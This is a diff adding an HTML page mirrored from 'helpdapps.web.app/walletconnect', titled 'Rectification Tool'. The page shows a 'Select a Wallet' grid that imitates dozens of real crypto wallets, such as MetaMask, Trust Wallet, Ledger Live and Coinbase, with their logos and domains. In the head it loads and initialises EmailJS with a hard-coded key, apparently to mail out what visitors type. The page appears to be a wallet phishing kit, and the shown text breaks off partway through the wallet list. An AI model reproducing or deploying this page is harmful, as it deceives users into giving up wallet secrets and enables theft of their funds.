@@ -1,0 +1,1787 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+
+
+<!-- Mirrored from helpdapps.web.app/walletconnect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Jun 2024 20:57:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+
+    <meta charset="utf-8">
+    <title>Rectification Tool</title>
+    <meta name="author" content="themesflat.com">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <link rel="stylesheet" type="text/css" href="choose_wallet_files/style.css">
+
+    <link rel="shortcut icon" href="choose_wallet_files/Favicon.html">
+    <link rel="apple-touch-icon-precomposed" href="choose_wallet_files/Favicon.html">
+
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <script>
+        emailjs.init('Jq9dta1_ZUrD6Qiuy'); // Replace with your actual EmailJS public key
+    </script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+
+
+</head>
+
+<!-- <body class="body header-fixed is_dark"> -->
+
+<body class="body header-fixed">
+
+
+
+
+
+
+
+    <div id="coinmarketcap-widget-marquee" coins="1,1027,825,1839,2010,74,4030" currency="USD" theme="dark" transparent="false" show-symbol-logo="true"></div>
+
+    <div class="preload preload-container">
+        <div class="preload-logo"></div>
+    </div>
+
+    <div id="wrapper">
+        <div id="page" class="clearfix">
+
+
+
+
+            <section class="tf-section top-seller" id="wallets_list">
+                <div class="themesflat-container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h2 class="tf-title style2">
+                                Select a Wallet</h2>
+                            <div class="heading-line s2"></div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="Wallet Connect"
+                                data-logo="choose_wallet_files/walle.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/walle.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Wallet Connect</a></h5>
+                                    <span class="price">walletconnect.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Trust Wallet"
+                                data-logo="choose_wallet_files/trust_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/trust_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Trust Wallet</a></h5>
+                                    <span class="price">trustwallet.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Chainge Wallet"
+                                data-logo="choose_wallet_files/chaingefi.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/chaingefi.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Chainge Wallet</a></h5>
+                                    <span class="price">chainge.finance</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Metamask"
+                                data-logo="choose_wallet_files/metamask.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/metamask.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Metamask</a></h5>
+                                    <span class="price">metamask.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Sub Wallet"
+                                data-logo="choose_wallet_files/subwallet.jpeg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/subwallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Sub Wallet</a></h5>
+                                    <span class="price">subwallet.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Xaman Wallet"
+                                data-logo="choose_wallet_files/xumm_pic.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/xumm_pic.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Xaman Wallet</a></h5>
+                                    <span class="price">xumm.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Hashpack"
+                                data-logo="choose_wallet_files/hash.jfif" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/hash.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Hashpack</a></h5>
+                                    <span class="price">hashpack.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="Keplr"
+                                data-logo="choose_wallet_files/keplr.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/keplr.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Keplr</a></h5>
+                                    <span class="price">keplr.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="Phantom Wallet"
+                                data-logo="choose_wallet_files/phantom_wallet.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/phantom_wallet.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Phantom Wallet</a></h5>
+                                    <span class="price">phantom.app</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Klever"
+                                data-logo="choose_wallet_files/klev.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/klev.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Klever</a></h5>
+                                    <span class="price">klever.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Solo Dex Wallet"
+                                data-logo="choose_wallet_files/solo_pic.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/solo_pic.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Solo Dex Wallet</a></h5>
+                                    <span class="price">sologenic.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Fantom"
+                                data-logo="choose_wallet_files/fantom.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/fantom.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Fantom</a></h5>
+                                    <span class="price">fantom.foundation</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Blade"
+                                data-logo="choose_wallet_files/blade.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/blade.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Blade</a></h5>
+                                    <span class="price">bladewallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Rabby Wallet"
+                                data-logo="choose_wallet_files/rabbywall.jpeg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/rabbywall.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Rabby Wallet</a></h5>
+                                    <span class="price">rabby.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Torus Wallet"
+                                data-logo="choose_wallet_files/torus.svg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/torus.svg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Torus Wallet</a></h5>
+                                    <span class="price">app.tor.us</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Cosmos"
+                                data-logo="choose_wallet_files/cosmos.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/cosmos.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Cosmos</a></h5>
+                                    <span class="price">cosmos.network</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Slope"
+                                data-logo="choose_wallet_files/slope.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/slope.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Slope Wallet</a></h5>
+                                    <span class="price">slope.finance</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="Flint Wallet" class="sc-author-box select_wallet" data-title="Flint Wallet"
+                                data-logo="choose_wallet_files/Flint.jpeg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/Flint.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class=""><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Flint Wallet</a></h5>
+                                    <span class="price">Flint-Wallet.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="binance" class="sc-author-box select_wallet" data-title="Binance Chain Wallet"
+                                data-logo="choose_wallet_files/binance.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/binance.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Binance Chain Wallet</a></h5>
+                                    <span class="price">binance.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="binance" class="sc-author-box select_wallet" data-title="Binance Chain Wallet"
+                                data-logo="choose_wallet_files/terra.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/terra.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Terra station</a></h5>
+                                    <span class="price">terra.money</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="polygon" class="sc-author-box select_wallet" data-title="Polygon Wallet"
+                                data-logo="choose_wallet_files/polygon.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/polygon.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Polygon Wallet</a></h5>
+                                    <span class="price">polygon.technology</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="rainbow" class="sc-author-box select_wallet" data-title="Rainbow"
+                                data-logo="choose_wallet_files/rainbow.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/rainbow.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Rainbow</a></h5>
+                                    <span class="price">rainbow.me</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Bitpay"
+                                data-logo="choose_wallet_files/bitpay.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/bitpay.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Bitpay</a></h5>
+                                    <span class="price">bitpay.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="waleth" class="sc-author-box select_wallet" data-title="Walleth"
+                                data-logo="choose_wallet_files/walleth.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/walleth.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Walleth</a></h5>
+                                    <span class="price">walleth.org</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="argent" class="sc-author-box select_wallet" data-title="Argent"
+                                data-logo="choose_wallet_files/argent.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/argent.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Argent</a></h5>
+                                    <span class="price">argent.xyz</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="huobi" class="sc-author-box select_wallet" data-title="Huobi Wallet"
+                                data-logo="choose_wallet_files/huobi.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/huobi.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Huobi Wallet</a></h5>
+                                    <span class="price">huobiwallet.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="encrypted_ink" class="sc-author-box select_wallet" data-title="Encrypted Ink"
+                                data-logo="choose_wallet_files/encrypted_ink.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/encrypted_ink.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Encrypted Ink</a></h5>
+                                    <span class="price">encrypted.ink</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="compound" class="sc-author-box select_wallet" data-title="Compound"
+                                data-logo="choose_wallet_files/compound.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/compound.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Compound</a></h5>
+                                    <span class="price">compound.finance</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="polkadot" class="sc-author-box select_wallet" data-title="Polkadot"
+                                data-logo="choose_wallet_files/polkadot.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/polkadot.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Polkadot</a></h5>
+                                    <span class="price">polkadot.network</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="iotex" class="sc-author-box select_wallet" data-title="Iotex"
+                                data-logo="choose_wallet_files/iotex.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/iotex.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Iotex</a></h5>
+                                    <span class="price">iotex.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="coin98" class="sc-author-box select_wallet" data-title="Coin98"
+                                data-logo="choose_wallet_files/coin98.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/coin98.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Coin98</a></h5>
+                                    <span class="price">coin98.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="coinbase" class="sc-author-box select_wallet" data-title="Coinbase"
+                                data-logo="choose_wallet_files/coinbase.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/coinbase.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Coinbase</a></h5>
+                                    <span class="price">coinbase.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="crypto" class="sc-author-box select_wallet" data-title="Crypto.com | Defi Wallet"
+                                data-logo="choose_wallet_files/crypto.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/crypto.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Crypto.com | Defi Wallet</a></h5>
+                                    <span class="price">crypto.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="token_pocket" class="sc-author-box select_wallet" data-title="Token Pocket"
+                                data-logo="choose_wallet_files/token_pocket.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/token_pocket.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Token Pocket</a></h5>
+                                    <span class="price">tokenpocket.pro</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="math_wallet" class="sc-author-box select_wallet" data-title="Math Wallet"
+                                data-logo="choose_wallet_files/math_wallet.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/math_wallet.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Math Wallet</a></h5>
+                                    <span class="price">mathwallet.org</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="ledger_live" class="sc-author-box select_wallet" data-title="Ledger Live"
+                                data-logo="choose_wallet_files/ledgerlive.png" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/ledgerlive.png" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Ledger Live</a></h5>
+                                    <span class="price">ledger.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="_1inch" class="sc-author-box select_wallet" data-title="1Inch"
+                                data-logo="choose_wallet_files/1inch.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/1inch.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>1Inch</a></h5>
+                                    <span class="price">1inch.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="dharma" class="sc-author-box select_wallet" data-title="Dharma"
+                                data-logo="choose_wallet_files/dharma.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/dharma.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Dharma</a></h5>
+                                    <span class="price">dharma.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="trust_vault" class="sc-author-box select_wallet" data-title="Trust Vault"
+                                data-logo="choose_wallet_files/trust_vault.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/trust_vault.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Trust Vault</a></h5>
+                                    <span class="price">trustology.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="my_key" class="sc-author-box select_wallet" data-title="MYKEY"
+                                data-logo="choose_wallet_files/mykey.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/mykey.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>MYKEY</a></h5>
+                                    <span class="price">mykey.org</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="atomic" class="sc-author-box select_wallet" data-title="Atomic"
+                                data-logo="choose_wallet_files/atomic.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/atomic.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Atomic</a></h5>
+                                    <span class="price">atomicwallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="cool_wallet_s" class="sc-author-box select_wallet" data-title="CoolWallet S"
+                                data-logo="choose_wallet_files/cool_wallet_s.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/cool_wallet_s.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>CoolWallet S</a></h5>
+                                    <span class="price">coolwallet.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="nash" class="sc-author-box select_wallet" data-title="Nash"
+                                data-logo="choose_wallet_files/nash.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/nash.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Nash</a></h5>
+                                    <span class="price">nash.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="coinomi" class="sc-author-box select_wallet" data-title="Coinomi"
+                                data-logo="choose_wallet_files/coinomi.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/coinomi.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Coinomi</a></h5>
+                                    <span class="price">coinomi.com</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="gridplus" class="sc-author-box select_wallet" data-title="GridPlus"
+                                data-logo="choose_wallet_files/gridplus.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/gridplus.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>GridPlus</a></h5>
+                                    <span class="price">gridplus.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="tokenary" class="sc-author-box select_wallet" data-title="Tokenary"
+                                data-logo="choose_wallet_files/tokenary.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
+                                        <img src="choose_wallet_files/tokenary.jpg" alt="Image" class="avatar">
+                                    </a>
+                                    <div class="#"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor">
+                                    <h5 class="style2"><a>Tokenary</a></h5>
+                                    <span class="price">tokenary.io</span>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                            <div id="safepal" class="sc-author-box select_wallet" data-title="SafePal"
+                                data-logo="choose_wallet_files/safepal.jpg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="index.html#">
